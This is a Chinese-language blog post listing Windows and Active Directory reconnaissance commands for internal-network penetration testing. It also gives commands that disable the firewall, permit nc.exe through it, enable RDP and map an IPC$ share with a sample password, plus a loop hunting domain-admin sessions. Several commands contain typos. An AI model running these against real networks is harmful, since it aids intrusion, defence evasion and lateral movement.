@@ -1,0 +1,555 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>内网信息搜集 | Bamboo22 's Blog</title><meta name="author" content="Bamboo22"><meta name="copyright" content="Bamboo22"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="内网信息搜集判断当前环境 查看当前网卡和IP信息 1ipconfig /all    查看操作系统详细信息 1systeminfo    查看当前登录域及域用户 1net config workstation    查看域内时间 1net time /domain  本机信息搜集 获取网卡配置信息 1ipconfig /all    查询操作系统和版本信息 12systeminfo | finds">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网信息搜集">
+<meta property="og:url" content="http://example.com/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/index.html">
+<meta property="og:site_name" content="Bamboo22 's Blog">
+<meta property="og:description" content="内网信息搜集判断当前环境 查看当前网卡和IP信息 1ipconfig /all    查看操作系统详细信息 1systeminfo    查看当前登录域及域用户 1net config workstation    查看域内时间 1net time /domain  本机信息搜集 获取网卡配置信息 1ipconfig /all    查询操作系统和版本信息 12systeminfo | finds">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://api.bimg.cc/random">
+<meta property="article:published_time" content="2024-01-23T09:30:12.000Z">
+<meta property="article:modified_time" content="2024-01-23T09:38:04.919Z">
+<meta property="article:author" content="Bamboo22">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://api.bimg.cc/random"><link rel="shortcut icon" href="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg"><link rel="canonical" href="http://example.com/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '内网信息搜集',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-01-23 17:38:04'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/modify.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://api.bimg.cc/random')"><nav id="nav"><span id="blog-info"><a href="/" title="Bamboo22 's Blog"><span class="site-name">Bamboo22 's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">内网信息搜集</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-01-23T09:30:12.000Z" title="发表于 2024-01-23 17:30:12">2024-01-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-23T09:38:04.919Z" title="更新于 2024-01-23 17:38:04">2024-01-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE/">内网渗透体系建设</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="内网信息搜集"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url('https://api.bimg.cc/random');"></div><article class="post-content" id="article-container"><h1 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h1><h2 id="判断当前环境"><a href="#判断当前环境" class="headerlink" title="判断当前环境"></a>判断当前环境</h2><ul>
+<li><p>查看当前网卡和IP信息</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看操作系统详细信息</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看当前登录域及域用户</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看域内时间</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></tbody></table></figure></li>
+</ul>
+<h2 id="本机信息搜集"><a href="#本机信息搜集" class="headerlink" title="本机信息搜集"></a>本机信息搜集</h2><ul>
+<li><p>获取网卡配置信息</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查询操作系统和版本信息</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"			 ——英文系统</span><br><span class="line">systeminfo | findstr /B /C:"OS Name" /C:"OS Version"	    ——中文系统</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看安装的软件及版本、路径</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>通过执行powershell命令来获取安装软件的版本以及路径</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell "Get-WmiObject -class Win32_Product |Select-Object -Property name,version"</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查询本机服务信息</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看当前进程列表和软件进程</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>通过wmic命令进行查询</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看当前进程列表对应的用户身份</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /v</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看当前进程是否有杀毒软件（AV）</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看启动程序信息</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看计划任务</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看主机开机时间</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查询本机用户列表</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看本机管理员</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看当前在线用户</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查询会话情况</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br><span class="line"></span><br><span class="line">net use \\10.10.10.13\ipc$ "Admin12345" /user:C1ay\administrator</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看本机端口开放情况</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查询补丁信息</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></tbody></table></figure></li>
+</ul>
+<ul>
+<li><p>查询路由表及ARP缓存表</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br><span class="line"></span><br><span class="line">arp -a</span><br></pre></td></tr></tbody></table></figure></li>
+</ul>
+<ul>
+<li><p>查询本机共享</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net share </span><br><span class="line"></span><br><span class="line">wmic share get name,path,status</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查询当前权限</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whomi</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看防火墙配置</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>修改防火墙配置信息：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">win 2003及之前的版本，运⾏指定程序全部连接：</span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe "allow nc" enable</span><br><span class="line"></span><br><span class="line">win 2003之后的版本用这条：</span><br><span class="line">netsh advfirewall firewall add rule name="pass nc" dir=in action=allow</span><br><span class="line">program="C:\nc.exe"</span><br><span class="line"></span><br><span class="line">允许指定程序连出，命令如下</span><br><span class="line">netsh advfirewall firewall add rule name="Allow nc" dir=out action=allow program="C:</span><br><span class="line">\nc.exe"</span><br><span class="line"></span><br><span class="line">允许 3389 端口放⾏，命令如下</span><br><span class="line">netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in</span><br><span class="line">localport=3389 action=allow</span><br><span class="line"></span><br><span class="line">自定义防⽕墙日志储存位置</span><br><span class="line">netsh advfirewall set currentprofile logging filename "C:\windows\temp\fw.log"</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>关闭防火墙</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">win 2003及之前的版本⽤这条命令：</span><br><span class="line">netsh firewall set opmode disable</span><br><span class="line">win 2003之后的版本⽤这条命令：</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看远程连接端口</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reg query "hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\RDP-Tcp” /v portnumber</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>开启远程连接服务</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 在 Windows Server 2003 中开启 3389 端⼝</span><br><span class="line">wmic path win32_terminalservicesetting where (__CLASS !="") call setallowtsconnections</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line"># 在 Windows Server 2008 和 Windows Server 2012 中开启 3389 端⼝</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where</span><br><span class="line">(__CLASS !="") call setallowtsconnections 1</span><br><span class="line"></span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where</span><br><span class="line">(TerminalName='RDP-Tcp') call setuserauthenticationrequired 1</span><br><span class="line"></span><br><span class="line"># 在 Windows 7 中开启 3389 端⼝</span><br><span class="line">reg add "HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER" /v</span><br><span class="line">fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看代理配置情况</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings</span><br></pre></td></tr></tbody></table></figure></li>
+</ul>
+<h2 id="域内信息搜集"><a href="#域内信息搜集" class="headerlink" title="域内信息搜集"></a>域内信息搜集</h2><ul>
+<li><p>获取域SID</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查询域内用户</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看域用户的详细信息</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user tom /domain</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查询域列表（假如存在多个域）</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看域内主机信息</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>获取所在指定域下的主机名</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain:C1ay</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看域内计算机</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group "domain computers" /domain</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看域信任关系</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查询域密码信息</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看域内时间（时间服务器）</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看域内用户组列表</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">net group /domain</span><br><span class="line"></span><br><span class="line">Domain Admins:域管理员。</span><br><span class="line">Domain Computers: 域内机器。</span><br><span class="line">Domain Controllers:域控制器。</span><br><span class="line">Domain Guest: 域访客，权限较低。</span><br><span class="line">Domain Users: 域用户。</span><br><span class="line">Enterprise Admins: 企业系统管理员用户。</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看存在的用户</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery user</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>通过nltest命令查找域控制器</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /dclist:test</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>通过查询域内时间</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看域控制器组</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group "Domain Controllers" /domain</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查询主域控制器</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdom query pdc</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>nslookup查询</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup DC1.c1ay.lab</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查看域管理员组</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators /domain</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>获取域管理员列表</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group "Domain Admins" /domain</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>列出进程和进程用户</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /v</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>查询域控制器列表</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group "Domain Controllers" /domain</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>收集域管理员列表</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group "Domain Admins" /domain</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>收集所有活动域的会话列表</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NetSess.exe -h DC1</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>交叉引用域管理员列表域活动会话列表</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; sessions.txt &amp;&amp; FOR /F %a in (admins.txt) DO @type sessions.txt | @findstr /I %a</span><br></pre></td></tr></tbody></table></figure>
+
+
+</li>
+<li><p>从 “Domain Admin” 组中收集域管理员</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group "Domain Admins" /domain</span><br></pre></td></tr></tbody></table></figure></li>
+</ul>
